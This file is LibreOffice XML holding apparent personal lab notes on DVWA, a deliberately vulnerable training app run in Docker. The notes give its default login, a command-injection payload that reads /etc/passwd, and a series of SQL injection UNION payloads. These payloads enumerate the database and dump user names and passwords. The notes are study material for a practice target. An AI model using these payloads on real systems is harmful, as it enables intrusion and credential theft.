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7e71" officeooo:paragraph-rsid="001e7e71"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Courier New" fo:font-size="14pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="001e7e71" officeooo:paragraph-rsid="001e7e71"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Courier New" fo:font-size="14pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="001ff559" officeooo:paragraph-rsid="001ff559"/>
    </style:style>
    <style:style style:name="P4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Courier New" fo:font-size="14pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="P5" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Courier New" fo:font-size="14pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="001ff559" officeooo:paragraph-rsid="001ff559"/>
    </style:style>
    <style:style style:name="P6" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Courier New" fo:font-size="14pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="00202153" officeooo:paragraph-rsid="00202153"/>
    </style:style>
    <style:style style:name="P7" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Courier New" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="001ff559" officeooo:paragraph-rsid="001ff559"/>
    </style:style>
    <style:style style:name="P8" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Courier New" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="00202153" officeooo:paragraph-rsid="00202153"/>
    </style:style>
    <style:style style:name="P9" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Arial" fo:font-size="10pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="00202153" officeooo:paragraph-rsid="00202153"/>
    </style:style>
    <style:style style:name="P10" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:rsid="001ff559" officeooo:paragraph-rsid="001ff559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number text:level="2" text:style-name="Numbering_20_Symbols" style:num-suffix="." style:num-format="1">
        <style:list-level-properties text:space-before="2.494cm"/>
      </text:list-level-style-number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hub.docker.com/r/vulnerables/web-dvwa</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">to run dvwa</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">docker run --rm -it -p 80:80 vulnerables/web-dvwa</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">admin</text:p>
      <text:p text:style-name="Standard">password</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="P1">command injection</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">if ip ifconfig -a</text:p>
      <text:p text:style-name="P1">ping ip</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P2">cat /etc/passwd</text:p>
      <text:p text:style-name="P2">192.168.1.106; cat /etc/passwd</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P3">sql injection</text:p>
      <text:p text:style-name="P3">%' or '0'='0</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">%' or 0=0 union select NULL , user() #</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">database version</text:p>
      <text:p text:style-name="P3">%' or 0=0 union select null, version() #</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">display db users</text:p>
      <text:p text:style-name="P5">%' or 0=0 union select null, user() #</text:p>
      <text:p text:style-name="Text_20_body"><text:line-break/></text:p>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="P10">DISPLAY NAME OF DATABASE</text:p>
      <text:p text:style-name="P5">%' or 0=0 union select null, database() #</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">ALL TABLES IN INFORMATION_SCHEMA</text:p>
      <text:p text:style-name="P7">%' and 1=0 union select null, table_name from information_schema.tables #</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7"><text:soft-page-break/>ALL USER TABLES IN INFORMATION_SCHEMA</text:p>
      <text:p text:style-name="P7">%' and 1=0 union select null, table_name from information_schema.tables where table_name like 'user%'#</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P8">ALL COLUMN FIELDS IN INFORMATION_SCHEMA FOR USER TABLE</text:p>
      <text:p text:style-name="P6">%' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #</text:p>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P6">ALL USER NAME AND PASSWORD</text:p>
      <text:p text:style-name="P9">%' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #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23:37.274271322</meta:creation-date>
    <dc:date>2019-10-23T12:09:24.825619392</dc:date>
    <meta:editing-duration>PT15M16S</meta:editing-duration>
    <meta:editing-cycles>1</meta:editing-cycles>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="2" meta:paragraph-count="28" meta:word-count="143" meta:character-count="992" meta:non-whitespace-character-count="876"/>
    <meta:generator>LibreOffice/6.0.7.3$Linux_X86_64 LibreOffice_project/00m0$Build-3</meta:generator>
  </office:meta>
</office:document-meta>
</file>